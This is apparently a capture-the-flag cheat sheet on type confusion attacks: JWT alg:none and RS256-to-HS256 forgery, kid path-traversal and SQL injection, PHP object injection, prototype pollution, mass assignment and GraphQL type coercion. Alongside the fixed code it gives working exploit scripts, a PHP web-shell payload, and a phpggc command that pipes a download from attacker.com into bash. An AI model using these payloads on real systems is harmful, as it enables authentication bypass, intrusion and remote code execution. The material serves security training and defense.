# Type Confusion — Advanced Exploitation

---

## Quick Reference

| Attack | Trigger | Impact |
|--------|---------|--------|
| JWT alg:none | Remove signature, set alg to none | Auth bypass without secret key |
| JWT RS256→HS256 | Sign with public key as HMAC secret | Forge any JWT |
| PHP object injection | Serialize user input, trigger `__wakeup` / `__destruct` | RCE, file write, SSRF |
| GraphQL type confusion | Send wrong type for field, bypass resolver logic | Auth bypass, data leak |
| Mass assignment | Send extra object properties the server assigns blindly | Privilege escalation |
| Prototype pollution | Inject `__proto__` into object merge | RCE, auth bypass, DoS |
| Array confusion | Send array where scalar expected | Bypass validation, crash, SQLi |
| XML/JSON type swap | Change type in deserialized structure | Logic bypass |

```javascript
// JWT RS256 → HS256 confusion — forge any token using the PUBLIC key
// 1. Get the server's public key (from /jwks.json or /.well-known/openid-configuration)
// 2. Sign a modified payload with the PUBLIC key as HMAC-SHA256 secret
// 3. Set alg: "HS256" in the header
// Server verifies with public key (thinking it's HMAC) → signature matches → accepted

const forged = jwt.sign(
    { user: "admin", role: "administrator" },
    publicKey,              // ← public key used as HMAC secret
    { algorithm: "HS256" } // ← confused server expects RS256 but gets HS256
);
```

---

## What are Advanced Type Confusion Attacks? 🔓

Advanced type confusion moves beyond primitive comparisons — these attacks exploit type confusion at the **architectural level**: authentication tokens that misidentify their algorithm, serialized objects whose type triggers code execution, and API schemas that trust the caller to supply the correct type for a value.

**Impact:**
- 🔴 Complete authentication bypass — forge JWT tokens without the private key
- 🔴 Remote code execution — PHP object injection via `__wakeup` / `__destruct` magic methods
- 🔴 Privilege escalation — mass assignment promotes regular user to admin
- 🔴 Application-wide compromise — prototype pollution poisons the base object all JS objects inherit from
- ⚠️ These attacks often chain with other vulnerabilities — type confusion as the entry point, RCE or account takeover as the outcome

---

## JWT Algorithm Confusion

JSON Web Tokens have a header, payload, and signature. The `alg` field in the header tells the server which algorithm to use for verification. The attack exploits servers that **trust the algorithm the client specifies** rather than enforcing a fixed expected algorithm.

### alg:none — Remove Signature Entirely

The JWT spec defines `none` as a valid algorithm meaning "no signature required." Some servers accept it.

**Normal JWT structure:**
```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidXNlciJ9.SIGNATURE
     ↑ header              ↑ payload           ↑ sig
```

**Forged JWT with alg:none:**

```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(
        json.dumps(data, separators=(',',':')).encode()
    ).rstrip(b'=').decode()

header  = b64url({"alg": "none", "typ": "JWT"})
payload = b64url({"user": "admin", "role": "administrator"})

# Signature is empty — just a trailing dot
forged_token = f"{header}.{payload}."
print(forged_token)
```

**Variations to try:**

```
alg: "none"
alg: "None"
alg: "NONE"
alg: "nOnE"
alg: ""
alg: null
```

⚠️ Modern JWT libraries reject `none` by default. But misconfigured servers that explicitly allow it or use old libraries are still common in CTFs.

### RS256 → HS256 Algorithm Confusion

This is the most powerful JWT attack. It exploits a fundamental confusion between:

- **RS256** — asymmetric: signed with **private key**, verified with **public key**
- **HS256** — symmetric: signed AND verified with the **same secret key**

If the server uses RS256 but doesn't enforce the algorithm, you can:
1. Switch `alg` to `HS256` in the header
2. Sign the token with the server's **public key** as the HMAC secret
3. The server verifies it with the public key — thinking it's the HMAC secret — and the signature matches

```
Normal RS256 flow:
Server signs:   JWT + private_key → signature
Client sends:   JWT + signature
Server checks:  signature vs public_key → valid ✅

Confused HS256 flow (attacker):
Attacker signs: JWT + public_key (as HMAC) → forged_signature
Client sends:   JWT with alg:HS256 + forged_signature
Server checks:  forged_signature vs public_key (as HMAC) → valid ✅ ← confused!
```

**Step-by-step exploit:**

```python
import jwt  # pip install pyjwt

# Step 1 — Get the public key
# Common locations:
# /jwks.json
# /.well-known/jwks.json
# /.well-known/openid-configuration → jwks_uri
# /api/auth/keys

public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

# Step 2 — Decode original token to see payload structure
original_token = "eyJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoidXNlciJ9.SIGNATURE"
decoded = jwt.decode(original_token, options={"verify_signature": False})
print(decoded)  # {'user': 'user', 'role': 'user'}

# Step 3 — Forge token with modified payload, signed with public key as HS256
forged_payload = {"user": "admin", "role": "administrator"}

forged_token = jwt.encode(
    forged_payload,
    public_key,          # ← public key as HMAC secret
    algorithm="HS256"
)
print(forged_token)  # use this in Authorization header
```

**Using jwt_tool (automated):**

```bash
# Install
git clone https://github.com/ticarpi/jwt_tool
pip3 install -r requirements.txt

# Algorithm confusion attack
python3 jwt_tool.py TOKEN -X a

# alg:none attack
python3 jwt_tool.py TOKEN -X n

# Crack HS256 secret (if weak)
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Modify payload and re-sign (if secret known)
python3 jwt_tool.py TOKEN -T -S hs256 -p "secret"
```

### JWT kid (Key ID) Injection

The `kid` header parameter tells the server which key to use for verification. If it's used in a SQL query or file path, it's injectable.

```json
{
  "alg": "HS256",
  "kid": "../../../../dev/null"
}
```

If `kid` is used as a file path, `/dev/null` reads an empty file → HMAC secret = empty string → sign with empty string:

```python
forged = jwt.encode(payload, "", algorithm="HS256")
# kid points to /dev/null → secret = "" → matches ✅
```

**SQL injection via kid:**

```json
{
  "alg": "HS256",
  "kid": "x' UNION SELECT 'attacker_secret' -- "
}
```

Server queries: `SELECT key FROM keys WHERE id = 'x' UNION SELECT 'attacker_secret' -- '`
Returns `attacker_secret` → sign token with `attacker_secret` → verified ✅

---

## PHP Object Injection

PHP's `unserialize()` converts a string back into a PHP object. If user input reaches `unserialize()`, the attacker can inject a **crafted serialized object** that triggers magic methods on deserialization — leading to RCE, file write, or SSRF.

### PHP Magic Methods

```php
__wakeup()    // called automatically when object is unserialized
__destruct()  // called automatically when object is destroyed (end of request)
__toString()  // called when object is used as string
__invoke()    // called when object is used as function
__call()      // called when undefined method is called on object
```

### Serialized Object Anatomy

```php
// PHP serialization format:
// O:ClassName:PropCount:{properties}
// s:length:"value"  ← string
// i:value           ← integer
// b:value           ← boolean (0/1)

// Example: serialize(new User("admin"))
O:4:"User":1:{s:4:"name";s:5:"admin";}
//   ↑ class   ↑ props    ↑ prop name  ↑ prop value
```

### RCE via __destruct

If the application has a class with a dangerous `__destruct` or `__wakeup`:

```php
// Vulnerable class in the codebase (attacker doesn't need to create it)
class Logger {
    public $filename;
    public $content;

    public function __destruct() {
        // Writes content to file when object is destroyed
        file_put_contents($this->filename, $this->content);
    }
}

// ❌ Vulnerable endpoint
$data = unserialize($_COOKIE['user_data']);
```

**Attacker crafts malicious serialized object:**

```php
// Craft object that writes a web shell
$evil = new Logger();
$evil->filename = "/var/www/html/shell.php";
$evil->content  = "<?php system($_GET['cmd']); ?>";

$payload = serialize($evil);
// O:6:"Logger":2:{s:8:"filename";s:26:"/var/www/html/shell.php";s:7:"content";s:29:"<?php system($_GET['cmd']); ?>";}

// Base64 encode and send as cookie:
// Cookie: user_data=TzoyOiJMb2dnZXIiOjI6...
```

### File Deletion via __destruct

```php
// Another common dangerous class
class TempFile {
    public $path;
    public function __destruct() {
        unlink($this->path);   // deletes file on object destroy
    }
}

// Attacker payload: delete /etc/passwd (if running as root)
$evil = new TempFile();
$evil->path = "/var/www/html/config.php";
echo serialize($evil);
// O:8:"TempFile":1:{s:4:"path";s:26:"/var/www/html/config.php";}
```

### POP Chain — Chaining Multiple Classes

Real-world PHP object injection uses **Property-Oriented Programming (POP) chains** — chaining multiple classes together where one's magic method calls another's method, eventually reaching a sink.

```php
// Chain: Unserialize → __wakeup → calls method on another object → RCE

class A {
    public $b;
    public function __wakeup() {
        $this->b->load();   // calls load() on object B
    }
}

class B {
    public $cmd;
    public function load() {
        system($this->cmd);  // ← RCE sink
    }
}

// Craft the chain:
$b = new B();
$b->cmd = "id";

$a = new A();
$a->b = $b;

echo serialize($a);
// Unserializing $a → __wakeup → $a->b->load() → system("id") → RCE ✅
```

**Tools:**

```bash
# PHPGGC — PHP Generic Gadget Chains (like ysoserial for PHP)
git clone https://github.com/ambionics/phpggc

# List available gadget chains
phpggc -l

# Generate payload for Laravel RCE
phpggc Laravel/RCE1 system id

# Generate base64-encoded payload
phpggc -b Laravel/RCE1 system "cat /flag.txt"

# Generate for Symfony
phpggc Symfony/RCE4 exec "curl attacker.com/shell.sh | bash"
```

---

## Prototype Pollution (JavaScript)

Every JavaScript object inherits from `Object.prototype`. Prototype pollution injects properties into this base prototype — so **every object in the application suddenly has those properties**.

### How It Works

```javascript
// Normal object
const obj = {};
obj.admin           // undefined
obj.hasOwnProperty  // function (inherited from Object.prototype)

// Pollute the prototype via __proto__
const payload = JSON.parse('{"__proto__": {"admin": true}}');
Object.assign({}, payload);  // merge triggers pollution

// Now EVERY object has .admin = true
const newObj = {};
newObj.admin          // true  ← polluted!
({}).admin            // true  ← polluted!
```

### Auth Bypass via Prototype Pollution

```javascript
// ❌ Vulnerable — checks property that can be polluted
function isAdmin(user) {
    return user.admin === true;
}

// Attacker pollutes Object.prototype.admin = true
// Now isAdmin({}) → {}.admin → true (from prototype) → admin access

// Vulnerable merge function:
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];   // ← assigns __proto__ properties
        }
    }
}

merge({}, JSON.parse('{"__proto__":{"admin":true}}'));
// Object.prototype.admin = true → every {} is now admin
```

### Prototype Pollution via Query String

```javascript
// qs library (used in Express) — parses nested objects from query strings
// Vulnerable to prototype pollution in older versions

// URL: /?__proto__[admin]=true
// qs parses: { __proto__: { admin: "true" } }
// Pollutes: Object.prototype.admin = "true"
```

### Prototype Pollution → RCE (Node.js)

In server-side Node.js, prototype pollution can reach `child_process` through template engines or `exec` calls:

```javascript
// Pollute with shell options
const payload = {
    "__proto__": {
        "shell": "node",
        "NODE_OPTIONS": "--inspect=attacker.com:4444"
    }
};

// If child_process.spawn is called with options from a polluted object:
// spawn("ls", [], {}) → {} inherits shell:"node" → command injection
```

**Tools:**

```bash
# ppmap — detect prototype pollution
git clone https://github.com/nicolo-ribaudo/ppmap

# Manual test — check if Object.prototype is polluted:
node -e "const o = {}; console.log(o.polluted);"  # should be undefined
# After attack:
node -e "const o = {}; console.log(o.polluted);"  # "yes" → polluted
```

---

## Mass Assignment

Mass assignment happens when an API or framework **automatically assigns all request body properties to a model** without filtering. The attacker adds extra properties the developer didn't intend to be writable.

### Basic Privilege Escalation

```javascript
// ❌ Vulnerable — blindly assigns all request body fields to user object
app.post('/api/update-profile', async (req, res) => {
    const updates = req.body;           // { name: "Alice", email: "a@b.com" }
    await User.update(userId, updates); // assigns ALL fields including role, admin, etc.
});

// Attacker sends:
// { "name": "Alice", "email": "a@b.com", "role": "admin", "admin": true }
// Server assigns ALL of them → instant admin promotion
```

### Mass Assignment in Different Frameworks

```python
# Django — ❌ Vulnerable
user = User(**request.POST.dict())    # assigns all POST fields

# ✅ Fixed
user = User(
    name=request.POST.get('name'),
    email=request.POST.get('email')
    # role is NOT assigned from user input
)

# Rails — ❌ Vulnerable (before strong parameters)
@user = User.new(params[:user])       # assigns everything

# ✅ Fixed — strong parameters whitelist
@user = User.new(user_params)
def user_params
    params.require(:user).permit(:name, :email)
end
```

### Finding Mass Assignment Targets

```http
-- Original request:
PATCH /api/users/123
{"name": "Alice"}

-- Test by adding sensitive fields:
PATCH /api/users/123
{"name": "Alice", "role": "admin"}

PATCH /api/users/123
{"name": "Alice", "isAdmin": true}

PATCH /api/users/123
{"name": "Alice", "verified": true, "credits": 99999}

PATCH /api/users/123
{"name": "Alice", "password": "newpass", "email": "attacker@evil.com"}
```

**Common sensitive fields to inject:**

```
role, admin, isAdmin, is_admin
verified, active, enabled
credits, balance, points
premium, subscription_tier
email_verified, phone_verified
password, password_hash
api_key, secret_key
permissions, scopes
```

---

## GraphQL Type Confusion

GraphQL schemas define strict types — but type confusion can arise when resolvers don't validate the type of arguments properly, or when input types are reused across different contexts.

### Int vs String Confusion in Arguments

```graphql
# Schema expects Int for user ID
query {
    user(id: 1) { name email role }
}

# Attacker sends string instead of int
query {
    user(id: "1 OR 1=1") { name email role }   # SQLi via type confusion
}

# Or sends array
query {
    user(id: [1, 2, 3]) { name email role }     # array where scalar expected
}
```

### Input Type Reuse — Privilege Escalation

```graphql
# ❌ Vulnerable — same input type used for create and admin-create
input UserInput {
    name: String!
    email: String!
    role: String    # optional field — admin only!
}

mutation {
    createUser(input: {
        name: "Attacker"
        email: "attacker@evil.com"
        role: "admin"          # ← field exists in schema, server doesn't check
    }) { id role }
}
```

### Type Confusion via Interfaces

```graphql
# Schema has interface Animal implemented by Dog and Cat
# If resolver checks type improperly:

query {
    getAnimal(id: 1) {
        ... on Dog { breed canFetch }
        ... on Cat { breed canFetch }   # Cat doesn't have canFetch
        # If server returns Dog data but labeled as Cat, field access may bypass checks
    }
}
```

---

## API Type Coercion Bypass

Many APIs accept JSON but coerce types loosely — especially when comparing user-supplied values against stored data.

### Boolean String Bypass

```http
-- App checks: if (body.admin === true)
-- Send string "true" instead of boolean

POST /api/admin/action HTTP/1.1
Content-Type: application/json

{"action": "delete_user", "admin": "true"}   ← string, not boolean

-- If server does: if (data.admin == true) → "true" == true → coerces → bypasses
-- If server does: if (data.admin)         → "true" is truthy → bypasses
```

### Numeric String in Comparisons

```http
-- Server checks: if (user.id === req.body.targetId)
-- user.id is int 1, attacker sends string "1"

{"targetId": "1"}     ← string "1" not int 1
-- Strict: "1" === 1 → false (safe)
-- Loose:  "1" == 1  → true  (bypasses)

-- Also try:
{"targetId": 1.0}     ← float
{"targetId": 1e0}     ← scientific
{"targetId": true}    ← boolean (1 == true)
{"targetId": [1]}     ← array containing 1
```

### Null / Undefined Injection

```http
-- Server checks: if (token !== null)
-- Send JSON null

{"token": null}        ← explicit null
{"token": undefined}   ← parsed as null in JSON
{"token": "null"}      ← string "null" (may pass null check)

-- If server does: if (token) → null is falsy → fails
-- If server does: if (token !== null) → null !== null = false → access denied
-- But: if (token != null) → loose → null == undefined → false... still denied
-- BUT: if (!token) → !null = true → takes "no token" branch which may be the bypass
```

---

## Exploitation Workflow

1. **Identify the token/auth mechanism** — JWT? Session cookie? API key? Determine the algorithm
2. **For JWT** — decode header without verification; check `alg` field; try `alg:none` first
3. **For RS256 JWT** — fetch public key from `/jwks.json`; attempt HS256 confusion attack
4. **For PHP apps** — search for `unserialize()` calls; identify dangerous classes with magic methods
5. **For PHP injection** — use `phpggc -l` to find available gadget chains for the framework
6. **For JS APIs** — test `__proto__` injection in object merge endpoints; check for prototype pollution
7. **For mass assignment** — add extra fields to PATCH/PUT requests; try `role`, `admin`, `verified`
8. **For GraphQL** — send wrong types for arguments; try string where int expected, add undocumented fields
9. **Verify impact** — confirm privilege escalation, RCE, or auth bypass with a benign test first
10. **Escalate** — use gained access to extract flag, pivot, or chain with other vulnerabilities

---

## Common Vulnerable Patterns

**JWT without algorithm enforcement:**

```javascript
// ❌ Vulnerable — trusts algorithm from token header
const decoded = jwt.verify(token, secretOrPublicKey);
// attacker sets alg:none → no verification performed

// ✅ Fixed — enforce expected algorithm
const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256'] });
```

**PHP unserialize on user input:**

```php
// ❌ Vulnerable
$obj = unserialize(base64_decode($_COOKIE['data']));

// ✅ Fixed — use JSON instead of serialize
$data = json_decode(base64_decode($_COOKIE['data']), true);
// If unserialize is required — use allowed_classes:
$obj = unserialize($data, ['allowed_classes' => false]);
```

**Vulnerable object merge (prototype pollution):**

```javascript
// ❌ Vulnerable — recursive merge without key filtering
function deepMerge(target, source) {
    for (const key of Object.keys(source)) {
        if (typeof source[key] === 'object') {
            deepMerge(target[key] ??= {}, source[key]);
        } else {
            target[key] = source[key];   // ← assigns __proto__ keys
        }
    }
}

// ✅ Fixed — skip prototype keys
function deepMerge(target, source) {
    for (const key of Object.keys(source)) {
        if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
            continue;   // ← skip dangerous keys
        }
        if (typeof source[key] === 'object') {
            deepMerge(target[key] ??= {}, source[key]);
        } else {
            target[key] = source[key];
        }
    }
}
```

**Mass assignment without field whitelist:**

```javascript
// ❌ Vulnerable
app.patch('/user', async (req, res) => {
    await db.users.update({ id: req.user.id }, req.body);
});

// ✅ Fixed — explicit field whitelist
app.patch('/user', async (req, res) => {
    const { name, email, bio } = req.body;   // only these fields
    await db.users.update({ id: req.user.id }, { name, email, bio });
});
```

---

## CTF & Practical Tips

**Fastest initial checks:**

```bash
# JWT — decode without verification
python3 -c "
import base64, json, sys
token = 'YOUR.JWT.TOKEN'
parts = token.split('.')
for p in parts[:2]:
    pad = p + '=' * (4 - len(p) % 4)
    print(json.dumps(json.loads(base64.urlsafe_b64decode(pad)), indent=2))
"

# Try alg:none
python3 jwt_tool.py TOKEN -X n

# Try RS256→HS256 (fetch public key first)
python3 jwt_tool.py TOKEN -X a

# PHP serialization — check for O: prefix in base64-decoded cookies
echo "COOKIE_VALUE" | base64 -d | head -c 50

# Prototype pollution — send in JSON body
{"__proto__": {"admin": true}}
{"constructor": {"prototype": {"admin": true}}}
```

**Speed tips:**
- ✅ Check `/jwks.json` and `/.well-known/openid-configuration` before any JWT attack — public key is often exposed there
- ✅ `jwt_tool.py -X a` automates RS256→HS256 confusion — fastest path for JWT CTFs
- ✅ For PHP injection — `phpggc -l | grep RCE` finds chains immediately; match framework from error pages
- ✅ Mass assignment: always try adding `"role":"admin"` and `"admin":true` to any PATCH/PUT body
- ✅ Prototype pollution: try both `__proto__` and `constructor.prototype` — some sanitizers block one but not the other
- ⚠️ JWT `kid` injection: if `kid` looks like a filename or DB key, try path traversal (`../../dev/null`) and SQLi
- ⚠️ PHP `unserialize` — look for base64-encoded cookies with `O:` prefix after decoding

**Common CTF scenarios:**
- **"Login as admin" + JWT visible** → `alg:none` first, then RS256→HS256 if public key exposed
- **"PHP app" + cookie looks encoded** → base64 decode → check for `O:` → object injection
- **"Node.js API accepts JSON"** → try `__proto__` pollution in any merge/update endpoint
- **"Update profile" endpoint** → mass assignment, add `role:admin` or `admin:true`
- **"GraphQL API"** → introspect schema, look for optional `role` fields in input types
- **"kid header in JWT"** → inject `../../dev/null` or `x' UNION SELECT 'secret'--`

---

## Key Takeaways

- ✅ JWT `alg:none` and RS256→HS256 confusion bypass authentication without knowing the secret — always check the `alg` field and whether the server enforces it
- ✅ PHP `unserialize()` on user input is almost always exploitable — magic methods fire automatically and gadget chains exist for every major PHP framework
- ✅ Prototype pollution poisons `Object.prototype` — every object in the app inherits the injected property, making it a powerful auth bypass and potential RCE vector
- ✅ Mass assignment requires only adding extra fields to existing requests — no special encoding or tooling needed
- ✅ JWT `kid` header injection combines type confusion with SQLi or path traversal — the key lookup mechanism becomes the attack surface
- ✅ All these attacks share the same root cause: the server trusts the caller to supply the correct type, algorithm, or structure — without independently verifying it